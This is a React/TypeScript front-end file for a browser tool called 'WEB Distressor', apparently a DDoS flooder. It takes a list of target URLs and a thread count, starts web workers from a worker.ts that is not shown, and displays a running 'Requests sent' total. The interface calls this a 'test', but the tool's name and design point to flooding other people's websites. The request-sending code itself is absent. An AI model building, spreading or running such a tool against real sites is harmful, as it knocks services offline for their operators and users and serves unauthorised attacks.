import { lift } from "@grammarly/focal";
import {
  Box,
  Button,
  Container,
  createTheme,
  CssBaseline,
  Alert,
  TextField,
  ThemeProvider,
  Typography,
  Divider,
} from "@mui/material";
import * as React from "react";
import {
  animationFrameScheduler,
  fromEvent,
  merge,
  observeOn,
  scan,
  tap,
} from "rxjs";

const theme = createTheme();

export const Main = () => {
  const [n, setN] = React.useState(0n);
  const [active, setActive] = React.useState(false);
  const run: React.FormEventHandler<HTMLFormElement> = (e) => {
    e.preventDefault();
    setActive(true);
    const data = new FormData(e.currentTarget);
    const url = data.get("target");
    const threads = +(data.get("threads") ?? 0);
    const msg = {
      type: "init",
      url,
      threads,
    };
    merge(
      ...[...Array(threads).keys()].map(() => {
        const w = new Worker(new URL("./worker.ts", import.meta.url), {
          type: "module",
        });
        w.postMessage(msg);
        return fromEvent<MessageEvent>(w, "message");
      })
    )
      .pipe(
        observeOn(animationFrameScheduler),
        scan((a, c) => a + c.data, 0n),
        tap(setN)
      )
      .subscribe();
  };

  return (
    <ThemeProvider theme={theme}>
      <Container component="main" maxWidth="xs">
        <CssBaseline />
        <Box
          sx={{
            marginTop: 8,
            display: "flex",
            flexDirection: "column",
            alignItems: "center",
          }}
        >
          <Typography component="h1" variant="h5">
            WEB Distressor 🇺🇦
          </Typography>
          <Box component="form" onSubmit={run} sx={{ mt: 1 }}>
            <TextField
              margin="normal"
              required
              fullWidth
              id="target"
              label="Target URLs (separated with ',')"
              name="target"
              autoFocus
              disabled={active}
            />
            <TextField
              margin="normal"
              required
              fullWidth
              name="threads"
              label="Number of threads"
              type="number"
              id="threads"
              defaultValue={5}
              disabled={active}
            />
            <Button
              disabled={active}
              type="submit"
              fullWidth
              variant="contained"
            >
              Start test
            </Button>
          </Box>
          <Divider />
          <Box component="div">
            <Alert severity="success">{`Requests sent: ${n}`}</Alert>
          </Box>
        </Box>
      </Container>
    </ThemeProvider>
  );
};
